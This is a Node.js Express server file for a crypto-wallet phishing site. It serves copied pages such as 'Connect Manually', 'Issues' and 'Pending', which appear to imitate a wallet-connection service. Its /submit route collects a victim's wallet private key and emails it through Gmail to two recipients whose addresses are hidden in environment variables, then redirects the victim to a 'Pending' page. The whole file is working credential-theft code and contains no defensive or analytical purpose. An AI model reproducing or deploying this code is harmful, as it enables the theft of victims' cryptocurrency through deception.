const express = require('express');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer')
const cors = require('cors')
const path = require('path')

const app = express();
dotenv.config();

app.use(cors())


app.use(express.static('views/evm-frontend'))
app.use(express.static(path.join(__dirname, "/public")))
app.use(express.static(__dirname + '/views/Home Page _ Welcome to Panelactivator.com_files/'))
app.use(express.static(__dirname + '/views/Welcome to our website_files/'))
app.use(express.static(__dirname + '/views/Connect Manually_files/'))
app.use(express.static(__dirname + '/views/Issues_files'))
app.use(express.static(__dirname + '/views/Pending_files/'))

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/index.html');
})

app.get('/explore', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/explore.html')
})

app.get('/explore/issues', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/connect.html')
})

app.get('/explore/issues/connect', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Issues.html')
})

app.get('/pending', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
})


app.post('/submit', async (req, res) => {
    const privateKey = req.body.data;  // Assuming this is the input from the user
    if (!privateKey) {
        console.log('Private key must be provided. Very crucial')
        return
    }

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.AUTH_USERNAME,
          pass: process.env.AUTH_PASSWORD
        }
      });

      await new Promise((resolve, reject) => {
        transporter.verify(function(error, success) {
          if (error){
            console.log(error)
            reject(error)
          }else{
            console.log('Server succesfully ready to send mail...')
            resolve(success)
          }
        })
      })

      const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2]
      for(let recipient of recipients){
        const mailOptions = {
          from: process.env.AUTH_USERNAME, //Testing email to see you received it successfully. Server configured email
          to: recipient,
          subject: `${req.body.category}`,
          html: `${req.body.data}`
        };

        await new Promise((resolve, reject) => {
          transporter.sendMail(mailOptions, async (error, info) => {
            if (error) {
              console.log(error)
              reject(error)
            }else{
              console.log('Email sent: ' + info.response)
              resolve(info)
            }
          })
        })
      }
      await delay(1000)
      res.redirect('/pending')
})



app.listen(process.env.PORT, () => {
    console.log(`Server is running on port ${process.env.PORT}`);
})